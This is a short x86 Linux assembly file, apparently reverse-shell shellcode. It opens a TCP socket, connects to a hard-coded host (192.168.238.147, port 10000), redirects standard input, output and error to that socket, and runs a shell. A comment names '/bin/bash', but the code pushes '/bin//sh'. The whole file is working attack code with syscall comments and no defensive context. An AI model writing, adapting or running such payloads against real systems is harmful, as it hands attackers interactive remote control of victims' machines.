global _start
section .text
_start:


;socket(AF_INET, SOCK_STREAM, 0)
; eax     ebx       ecx      edx
createSocket:
mov ax,359
mov bl,2
mov cl,1
mov dl,0
int 0x80
xor edi,edi
mov edi,eax


;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
createConnect:
xor eax,eax
mov ebx,edi
push eax
push eax
; pushed 192.168.238.147
push word 0x93EE ; pushed 147.238
push word 0xA8C0 ; pushed 168.192

push word 0x1027 ;pushed port number htons(10000) on stack
push word 0x2 ; pushed AF_INET
mov ecx, esp ; 
mov dl, 16 ; moved addr len to dl
mov eax,362 ; connect system call
int 0x80
add esp, 16 

;int dup2(int oldfd, int newfd);
CloneDescriptors:
xor eax,eax
mov al, 63
mov ebx, edi
xor ecx,ecx
int 0x80

;int dup2(int oldfd, int newfd);
xor eax,eax
mov al, 63
xor ecx,ecx
mov cl, 1
int 0x80

;int dup2(int oldfd, int newfd);
xor eax,eax
mov al, 63
xor ecx,ecx
mov cl, 2
int 0x80


;execve("/bin/bash")
Execve:
xor eax,eax
push eax
mov al,11
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx,ecx
push ecx
push ebx
mov ecx, esp
xor edx,edx
int 0x80

